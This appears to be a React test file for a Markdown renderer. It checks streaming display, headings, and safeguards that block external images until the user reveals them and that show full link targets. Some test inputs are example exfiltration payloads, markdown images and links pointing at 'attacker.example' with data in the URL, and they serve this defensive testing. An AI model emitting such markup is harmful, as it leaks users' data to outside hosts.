import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "./Markdown";

describe("Markdown", () => {
  it("renders plain text while streaming (no GFM heading)", () => {
    const { container } = render(
      <Markdown text={"# Title\n\nhello"} streaming />,
    );
    const root = container.querySelector("[data-streaming='true']");
    expect(root).not.toBeNull();
    expect(root?.textContent).toContain("# Title");
    expect(container.querySelector("h1")).toBeNull();
  });

  it("renders GFM when settled", () => {
    render(<Markdown text={"# Title"} />);
    expect(screen.getByRole("heading", { level: 1 }).textContent).toBe(
      "Title",
    );
  });

  it("does not load an external image until the user reveals it", () => {
    const { container } = render(
      <Markdown text={"![secret](https://attacker.example/x.png?d=1)"} />,
    );
    expect(container.querySelector("img")).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: /外部图片未加载/ }));
    expect(container.querySelector("img")?.getAttribute("src")).toContain(
      "attacker.example",
    );
  });

  it("still renders a same-origin image", () => {
    const { container } = render(<Markdown text={"![](/assets/a.png)"} />);
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "/assets/a.png",
    );
  });

  it("shows the full link target", () => {
    render(<Markdown text={"[click](https://attacker.example/leak)"} />);
    expect(screen.getByText("(https://attacker.example/leak)")).toBeTruthy();
  });
});
